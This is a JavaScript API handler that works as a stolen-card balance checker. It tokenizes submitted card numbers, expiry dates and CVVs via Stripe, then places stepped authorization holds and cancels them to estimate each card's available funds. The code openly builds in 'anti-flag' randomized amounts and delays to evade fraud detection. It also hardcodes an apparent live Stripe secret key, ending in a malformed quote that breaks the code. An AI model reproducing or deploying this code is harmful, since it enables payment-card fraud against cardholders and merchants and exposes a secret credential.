const stripe = require('stripe')('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’); // Replace with your Stripe secret key

export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const { card_number, exp, cvv, bin } = req.body;

    if (!card_number || !exp || !cvv || !bin) {
        return res.json({ balance: 'Error: All fields required' });
    }

    // Basic Luhn check
    if (!isValidLuhn(card_number)) {
        return res.json({ balance: 'Error: Invalid card number' });
    }

    try {
        // Create a token for the card
        const token = await stripe.tokens.create({
            card: {
                number: card_number,
                exp_month: exp.split('/')[0],
                exp_year: '20' + exp.split('/')[1],
                cvc: cvv,
            },
        });

        // Custom Anti-Flag Logic: Stepped probing with delays
        const probeAmounts = [100, 1000, 10000, 50000, 100000]; // $1, $10, $100, $500, $1000 (cents) - stepped to avoid patterns
        let lastSuccessful = 0;
        let estimatedBalance = 'Error: No available balance or declined';

        for (let i = 0; i < probeAmounts.length; i++) {
            const amount = probeAmounts[i] + Math.floor(Math.random() * 100); // Add slight randomization to break patterns

            try {
                const paymentIntent = await stripe.paymentIntents.create({
                    amount: amount,
                    currency: 'usd',
                    payment_method_data: {
                        type: 'card',
                        card: { token: token.id },
                    },
                    confirm: true,
                    capture_method: 'manual',
                    description: 'Balance check - low profile',
                });

                if (paymentIntent.status === 'requires_capture' || paymentIntent.status === 'succeeded') {
                    lastSuccessful = Math.floor(amount / 100); // Dollars
                    await stripe.paymentIntents.cancel(paymentIntent.id); // Cancel immediately to void
                } else {
                    // Declined - estimate based on last success
                    if (lastSuccessful > 0) {
                        estimatedBalance = `Estimated Balance: $${lastSuccessful} - $${Math.floor(amount / 100)}`;
                    }
                    break; // Stop early to reduce probes
                }
            } catch (err) {
                if (lastSuccessful > 0) {
                    estimatedBalance = `Estimated Balance: $${lastSuccessful}`;
                }
                break; // Stop on error
            }

            // Anti-flag delay: 2-5 seconds between probes
            await new Promise(resolve => setTimeout(resolve, 2000 + Math.random() * 3000));
        }

        // If all succeeded, high balance
        if (estimatedBalance === 'Error: No available balance or declined' && lastSuccessful > 0) {
            estimatedBalance = `Balance: $${lastSuccessful}+`;
        }

        res.json({ balance: estimatedBalance });

    } catch (err) {
        res.json({ balance: `Error: ${err.message}` });
    }
}

// Luhn algorithm
function isValidLuhn(cardNumber) {
    let sum = 0;
    let shouldDouble = false;
    for (let i = cardNumber.length - 1; i >= 0; i--) {
        let digit = parseInt(cardNumber.charAt(i));
        if (shouldDouble) {
            digit *= 2;
            if (digit > 9) digit -= 9;
        }
        sum += digit;
        shouldDouble = !shouldDouble;
    }
    return sum % 10 === 0;
}
